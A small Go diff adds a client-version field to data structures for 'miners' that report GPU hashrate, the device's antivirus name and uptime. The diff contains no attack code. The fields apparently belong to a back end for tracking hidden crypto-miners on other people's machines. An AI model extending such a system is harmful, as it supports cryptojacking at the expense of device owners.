@@ -10,6 +10,7 @@ type MinerReport struct {
 	GPUHashrate     float64 `json:"gpu_hashrate"` // in H/s
 	AntivirusName   string  `json:"antivirus_name"`
 	DeviceUptimeMin int     `json:"device_uptime_min"` // in minutes
+	ClientVersion   string  `json:"client_version"`    // Client version string
 	Timestamp       int64   `json:"timestamp"`
 }
 
@@ -38,6 +39,7 @@ type Miner struct {
 	GPUHashRate     float64 `json:"gpu_hashrate"`
 	AntivirusName   string  `json:"antivirus_name"`
 	DeviceUptimeMin int     `json:"device_uptime_min"`
+	ClientVersion   string  `json:"client_version"`
 	Status          string  `json:"status"`
 	LastSeen        int64   `json:"last_seen"`
 	CreatedAt       int64   `json:"created_at"`
